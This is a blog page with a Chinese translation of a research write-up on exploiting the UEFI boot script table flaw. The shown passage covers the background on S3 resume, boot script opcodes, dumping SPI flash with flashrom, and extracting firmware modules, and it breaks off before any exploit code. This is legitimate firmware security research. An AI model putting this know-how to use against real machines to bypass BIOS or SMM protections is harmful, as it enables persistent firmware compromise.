<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/project/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/project/fontawesome/css/brands.css" rel="stylesheet">
<link href="/project/fontawesome/css/solid.css" rel="stylesheet">
<script src="/project/js/color.global.min.js" ></script>
<script src="/project/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>UEFI 引导脚本表漏洞利用 | Edvison&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;02&#x2F;exploiting-uefi-boot-script-table.html">
<meta property="og:type" content="article">
<meta property="og:title" content="UEFI 引导脚本表漏洞利用">
<meta property="og:url" content="https://edvison.github.io/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Edvison&#39;s blog">
<meta property="og:description" content="原文： http:&#x2F;&#x2F;blog.cr4.sh&#x2F;2015&#x2F;02&#x2F;exploiting-uefi-boot-script-table.html">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162237105.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162247266.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162254120.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162302082.png">
<meta property="og:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162331163.png">
<meta property="article:published_time" content="2023-08-09T08:22:03.000Z">
<meta property="article:modified_time" content="2023-08-09T08:25:00.039Z">
<meta property="article:author" content="edvison">
<meta property="article:tag" content="UEFI">
<meta property="article:tag" content="漏洞利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162237105.png">
  
    <link rel="alternate" href="/project/atom.xml" title="Edvison's blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/project/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/project/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/project/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230807175151.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/project/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Edvison's blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/project/">Home</a>
    
      <a class="main-nav-link" href="/project/archives">Archives</a>
    
      <a class="main-nav-link" href="/project/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/project/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/project/">Home</a>
    
      <a class="nav-dropdown-link" href="/project/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/project/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/project/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/20230808155156.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Edvison </div>
      <div class="dot"></div>
      <div class="subtitle">flung out of space </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Edvison" title="github"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://weibo.com/u/6038772011" title="weibo"><i class="fa-brands fa-weibo"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">分类</h3>
      <div class="category-box">
            <a class="category-link" href="/project/categories/UEFI%E5%8E%9F%E7%90%86/">
                UEFI原理
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/project/categories/UEFI%E5%9B%BA%E4%BB%B6%E5%AE%89%E5%85%A8/">
                UEFI固件安全
                <div class="category-count">6</div>
            </a>
        
            <a class="category-link" href="/project/categories/MBR%E5%8E%9F%E7%90%86/">
                MBR原理
                <div class="category-count">2</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">
                翻译
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/Grub2%E5%8E%9F%E7%90%86/">
                Grub2原理
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/IoT%E5%AE%89%E5%85%A8/">
                IoT安全
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/project/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
                硬件安全
                <div class="category-count">4</div>
            </a>
        
            <a class="category-link" href="/project/categories/VBIOS%E4%BF%AE%E6%94%B9/">
                VBIOS修改
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/CSM/" rel="tag">CSM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/DMA%E6%94%BB%E5%87%BB/" rel="tag">DMA攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/Grub2/" rel="tag">Grub2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/HID%E6%94%BB%E5%87%BB/" rel="tag">HID攻击</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR/" rel="tag">MBR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/MBR%E5%90%8E%E9%97%A8/" rel="tag">MBR后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OS-Loader/" rel="tag">OS Loader</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/OVMF%E7%BC%96%E8%AF%91/" rel="tag">OVMF编译</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/PCH/" rel="tag">PCH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM/" rel="tag">SMM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E5%90%8E%E9%97%A8/" rel="tag">SMM后门</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/SMM%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">SMM漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/VBIOS/" rel="tag">VBIOS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/pcie/" rel="tag">pcie</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4/" rel="tag">写保护</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%86%99%E4%BF%9D%E6%8A%A4%E7%AA%81%E7%A0%B4/" rel="tag">写保护突破</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%8E%9F%E7%90%86/" rel="tag">原理</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%AE%89%E5%85%A8%E5%90%AF%E5%8A%A8/" rel="tag">安全启动</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E5%BC%80%E5%8F%91%E6%9D%BF/" rel="tag">开发板</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/" rel="tag">树莓派</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" rel="tag">漏洞扫描</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" rel="tag">环境搭建</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/project/tags/%E7%94%B5%E6%BA%90%E6%95%85%E9%9A%9C/" rel="tag">电源故障</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/project/archives/2023/08 ">
          八月 2023 
          <div class="archive-count">22 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <a class="recent-link" href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="Lenovo固件中的SMM callout漏洞利用" >
            <div class="recent-link-text">
              Lenovo固件中的SMM callout漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%88%A9%E7%94%A8DMA%E6%94%BB%E5%87%BB%E7%AA%81%E7%A0%B4UEFI%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/" title="利用DMA攻击突破UEFI安全机制" >
            <div class="recent-link-text">
              利用DMA攻击突破UEFI安全机制
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" title="UEFI 引导脚本表漏洞利用" >
            <div class="recent-link-text">
              UEFI 引导脚本表漏洞利用
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/%E5%9F%BA%E4%BA%8EUEFI%E5%B9%B3%E5%8F%B0%E7%9A%84SMM%E5%90%8E%E9%97%A8%E6%9E%84%E5%BB%BA/" title="基于UEFI平台的SMM后门构建" >
            <div class="recent-link-text">
              基于UEFI平台的SMM后门构建
            </div>
          </a>
        
          <a class="recent-link" href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="P4wnP1配置与使用" >
            <div class="recent-link-text">
              P4wnP1配置与使用
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-UEFI-引导脚本表漏洞利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        UEFI 引导脚本表漏洞利用
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-08-09T08:22:03.000Z" itemprop="datePublished">2023-08-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/project/categories/%E7%BF%BB%E8%AF%91/">翻译</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            9.4k 词 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/UEFI/" rel="tag">UEFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>原文： <a target="_blank" rel="noopener" href="http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html">http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html</a></p>
<span id="more"></span>

<p>大约一个月前（2015年1月），在第31届Chaos Communication大会上，Rafal Wojtczuk和Corey Kallenberg展示了一项出色的研究：“攻击UEFI安全系统，灵感来源于Darth Venamis’s misery 和 Speed Racer”（<a target="_blank" rel="noopener" href="https://media.ccc.de/v/31c3_-_6129_-_en_-_saal_2_-_201412282030_-_attacks_on_uefi_security_inspired_by_darth_venamis_s_misery_and_speed_racer_-_rafal_wojtczuk_-_corey_kallenberg#video">视频</a>，<a target="_blank" rel="noopener" href="https://frab.cccv.de/system/attachments/2565/original/speed_racer_whitepaper.pdf">白皮书1</a>, <a target="_blank" rel="noopener" href="https://frab.cccv.de/system/attachments/2566/original/venamis_whitepaper.pdf">白皮书2</a>）。研究人员发现UEFI漏洞的主要目标 —— 绕过市场上各种现代主板和笔记本电脑上的不同平台安全措施是很简单的(BIOS写保护、SMM保护)。通常，此类漏洞在利用后阶段很有用，感染目标机器后隐藏自身并可以在重装操作系统后仍然存活的BIOS后门。另外，公开的引导脚本表（boot script table）漏洞(<a target="_blank" rel="noopener" href="https://www.kb.cert.org/vuls/id/976132">CERT VU #976132</a>)非常有趣，因为它是目前允许访问SMM的最公开的漏洞之一（使一个高权限的CPU模式变得更强大，即ring0 或硬件管理层）<br>然而，Rafal和Corey还没有发布他们的PoC代码来检查你的系统是否存在UEFI引导脚本表漏洞，所以我决定写一篇博客，介绍我在测试硬件上对它的一步步开发过程：<a target="_blank" rel="noopener" href="https://www.intel.com/content/www/us/en/support/products/59046/boards-and-kits/desktop-boards/intel-desktop-boards-with-intel-q77-express-chipset/intel-desktop-board-dq77kb.html">Intel DQ77KB</a>主板和7代Q77芯片组。理论上，所有的逆向工程和开发步骤也可以在任何其他UEFI兼容的主板上复制，因此，你可以修改利用代码来添加对其他模型的支持。至于BIOS_CNTL竞态条件漏洞(<a target="_blank" rel="noopener" href="https://www.kb.cert.org/vuls/id/766164">CERT VU #766164</a>)，我的主板不存在该漏洞，因为它正确地设置了SMM_BWP位。<br>同时，在阅读这篇文章的时候，你应该记住，我所说的BIOS通常指的是“一般的PC固件”，而不是传统(pre-UEFI) BIOS。我所描述的攻击与传统BIOS无关，因为在大多数情况下，它根本没有适当的平台安全机制。</p>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>UEFI引导脚本表 （boot script table） 是当平台大部分组件处于关机状态时，ACPI S3在休眠期间用来保存平台状态的数据结构。通常这种结构体位于特殊的非易失性存储(NVS)内存区域。UEFI代码在正常引导时构造引导脚本表，并在平台从睡眠中唤醒时，在S3恢复时解析它的表项。攻击者能够在某些安全特性尚未初始化或尚未锁定时，从操作系统内核模式修改当前引导脚本表内容，来触发S3的挂起-恢复周期，并在平台初始化早期实现任意代码执行。如果你还没看过Rafal和Corey的演讲，现在是时候去看看了。<br>Intel官方文档(Intel®Platform Innovation Framework for EFI)是获取关于UEFI S3 resume架构信息的最佳起点：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.intel.com/content/dam/doc/reference-guide/efi-s3-resume-boot-path-specification.pdf">S3 Resume Boot Path Specification</a></li>
<li><a target="_blank" rel="noopener" href="http://www.intel.com/content/dam/doc/guide/efi-boot-script-specification-v091.pdf">Boot Script Specification</a></li>
</ul>
<p>以上文档中的很多东西都有在<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2">EDK2</a>源码中参考实现。实际上，许多制造商都使用他们自己的代码，但是，EDK2是一个很好的信息源，它可能有助于你更好地理解一些不清楚的东西。<br>正常启动和S3恢复时的平台启动路径如下图所示：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162237105.png" alt="image-20230809162237105"></p>
<p>需要对固件进行逆向来利用这个漏洞，因为引导脚本表的位置和格式是特定于供应商的。Boot Script规范定义了一组必须由解析器实现的操作，而不是boot script二进制格式本身：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define EFI_BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00 </span><br><span class="line">#define EFI_BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01 </span><br><span class="line">#define EFI_BOOT_SCRIPT_MEM_WRITE_OPCODE                0x02 </span><br><span class="line">#define EFI_BOOT_SCRIPT_MEM_READ_WRITE_OPCODE           0x03 </span><br><span class="line">#define EFI_BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE         0x04 </span><br><span class="line">#define EFI_BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE    0x05 </span><br><span class="line">#define EFI_BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE            0x06 </span><br><span class="line">#define EFI_BOOT_SCRIPT_STALL_OPCODE                    0x07 </span><br><span class="line">#define EFI_BOOT_SCRIPT_DISPATCH_OPCODE                 0x08</span><br></pre></td></tr></table></figure>


<p>S3恢复的真正实现可能还需要一些定制的操作码。显然，它们在任何规范中都没有描述。</p>
<h2 id="提取并解压固件"><a href="#提取并解压固件" class="headerlink" title="提取并解压固件"></a>提取并解压固件</h2><p>首先，要对引导脚本表解析器进行逆向，我们需要获取目标平台的固件文件。你可以从厂商的网站上下载固件更新并解压，但如果你不想打乱固件更新格式的话（那些可能是专用的或未公开的）最好从位于主板上的SPI闪存芯片上转储实际的flash image内容。在大多数情况下，为了转储flash，你可以直接使用运行在目标平台操作系统环境中的<a target="_blank" rel="noopener" href="http://flashrom.org/">flashrom</a>工具(软件方式)。如果 flashrom不支持 你的芯片组&#x2F;主板，比如我的DQ77KB，你可以在其他计算机上使用SPI编程器来读取闪存芯片的内容（不用拆卸可以）：<br>Intel DQ77KB有两个不同的SPI闪存芯片：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162247266.png" alt="image-20230809162247266"></p>
<p>刚开始我认为它可能是类似于双BIOS技术的东西，但实际上，这些芯片的容量不同(64和32 Mbit)，它们都用于存储单个闪存镜像，而一个64Mbit的芯片无法容纳单个闪存镜像。为了更方便测试，不用每次都读写两个芯片，我决定使用FTDI的<a target="_blank" rel="noopener" href="https://www.ftdichip.com/Products/Modules/DevelopmentModules.htm">FT2232H</a>双通道迷你模块，它拥有USB接口，并且支持许多广泛使用的硬件协议，如SPI，UART，I2C和JTAG。板子的A，B通道分别于第1个和第2个芯片相连：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162254120.png" alt="image-20230809162254120"></p>
<p>如果你只需要读取闪存芯片一次或几次——可以使用微探针或SOIC-8测试夹来连接芯片。<br>因为我在做各种不同类型的工作，经常需要修改固件且很容易把主板刷成砖，我决定将带有8-pin PLS连接器的МГТФ细导线直接焊到我的芯片引脚上。这种设置更方便，更牢固， 在封闭的情况下， 你可以把它放在你的桌子上，而不需要浪费时间连接探针或夹子：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809162302082.png" alt="image-20230809162302082"></p>
<p>Flashrom允许将基于FTDI FT2232&#x2F;FT4232H&#x2F;FT232H的设备作为外部SPI编程器，让我们来读取两个芯片的内容并将它们拼接起来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># flashrom -p ft2232_spi:type=2232H,port=A --read fw.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flashrom v0.9.7-r1854 on Linux 3.8.0-44-generic (x86_64)</span><br><span class="line">flashrom is free software, get the source code at http://www.flashrom.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Calibrating delay loop... OK.</span><br><span class="line">Found Winbond flash chip &quot;W25Q64.V&quot; (8192 kB, SPI) on ft2232_spi.</span><br><span class="line">Reading flash... done.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># flashrom -p ft2232_spi:type=2232H,port=B --read fw_2.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flashrom v0.9.7-r1854 on Linux 3.8.0-44-generic (x86_64)</span><br><span class="line">flashrom is free software, get the source code at http://www.flashrom.org</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Calibrating delay loop... OK.</span><br><span class="line">Found Winbond flash chip &quot;W25Q32.V&quot; (4096 kB, SPI) on ft2232_spi.</span><br><span class="line">Reading flash... done.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cat fw_2.bin &gt;&gt; fw.bin &amp;&amp; rm fw_2.bin</span><br></pre></td></tr></table></figure>


<p>读取的固件flash描述符来自可能包含Firmware File System(FFS)卷的不同区域(BIOS、ME等)。UEFI代码在不同类型（例如PEI阶段，DXE阶段，SMM代码）的不同模块（使用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Portable_Executable">PE&#x2F;COFF</a>文件格式）之间进行解压，这些模块以文件的形式存储在FFS中。在现代主板的UEFI中可能包含数百个PE模块（在我的DQ77KB中约250个）。<br>为了提取这些模块，我们使用<a target="_blank" rel="noopener" href="https://github.com/theopolis/uefi-firmware-parser">uefi-firmware-parser</a>工具。它不是一个完美的工具，但在我的例子中，在修复了几个错误之后，uefi-firmware-parser能够正常工作（程序作者已经将它们包含在源代码中）。此外，这个工具是用Python编写的，这使得它相对灵活且便于修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">$ cd uefi-firmware-parser</span><br><span class="line">$ python scripts/fv_parser.py --extract --output ./fw_extracted --flash fw.bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parsing Flash descriptor.</span><br><span class="line">Flash Descriptor (Intel PCH) chips 1, regions 3, masters 2, PCH straps 18, PROC straps 1, ICC entries 0</span><br><span class="line">  Flash Region type= bios, size= 0x640000 (6553600 bytes) details[ read: 11, write: 10, base: 1472, limit: 3071, id: 0 ]</span><br><span class="line">    Firmware Volume: 8c8ce578-8a3d-4f1c-3599-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xe6ae, size 0x20000 (131072 bytes)</span><br><span class="line">      Firmware Volume Blocks:  (32, 0x1000)</span><br><span class="line">      File 0: cef5b9a3-476d-497f-dc9f-e98143e0422c type 0x01, attr 0x00, state 0x0f, size 0x1ffb8 (131000 bytes), (raw)</span><br><span class="line">        RawObject: size= 130976</span><br><span class="line">    Firmware Volume: 8c8ce578-8a3d-4f1c-3599-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xe6ae, size 0x20000 (131072 bytes)</span><br><span class="line">      Firmware Volume Blocks:  (32, 0x1000)</span><br><span class="line">      File 0: cef5b9a3-476d-497f-dc9f-e98143e0422c type 0x01, attr 0x00, state 0x07, size 0x1ffb8 (131000 bytes), (raw)</span><br><span class="line">        RawObject: size= 130976</span><br><span class="line">    Firmware Volume: 8c8ce578-8a3d-4f1c-3599-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xe648, size 0x80000 (524288 bytes)</span><br><span class="line">      Firmware Volume Blocks:  (128, 0x1000)</span><br><span class="line">      File 0: a6beb857-b370-40fb-eb8e-df17aacd955f type 0x02, attr 0x00, state 0x07, size 0x926a (37482 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x01, size 0x9252 (37458 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x19, size 0x9864 (39012 bytes) (Raw section)</span><br><span class="line">      File 1: 918e7ad1-c1fa-474e-ed82-356dd84f3795 type 0x02, attr 0x00, state 0x07, size 0x7182 (29058 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x01, size 0x716a (29034 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x19, size 0x76b8 (30392 bytes) (Raw section)</span><br><span class="line">      File 2: ed10cbd0-ec4d-412e-e080-e541edc805f7 type 0x02, attr 0x00, state 0x07, size 0x506a (20586 bytes), (freeform)</span><br><span class="line">        Section 0: type 0x01, size 0x5052 (20562 bytes) (Compression section)</span><br><span class="line">          Section 0: type 0x19, size 0x53ed (21485 bytes) (Raw section)</span><br><span class="line">    Firmware Volume: 8c8ce578-8a3d-4f1c-3599-896185c32dd3 attr 0x0003feff, rev 2, cksum 0xe648, size 0x80000 (524288 bytes)</span><br><span class="line">      Firmware Volume Blocks:  (128, 0x1000)</span><br><span class="line">      File 0: 17088572-377f-44ef-4e8f-b09fff46a070 (CPU_MICROCODE_FILE_GUID) type 0x01, attr 0x48, state 0x07, size 0xa018 (40984 bytes), (raw)</span><br><span class="line">        RawObject: size= 40960</span><br><span class="line">      File 1: 3b42ef57-16d3-44cb-3286-9fdb06b41451 (DELL_MEMORY_INIT_GUID) type 0x06, attr 0x40, state 0x07, size 0x272fc (160508 bytes), (pei module)</span><br><span class="line">        Section 0: type 0x1b, size 0x100 (256 bytes) (PEI dependency expression section)</span><br><span class="line">        Section 1: type 0x10, size 0x271e4 (160228 bytes) (PE32 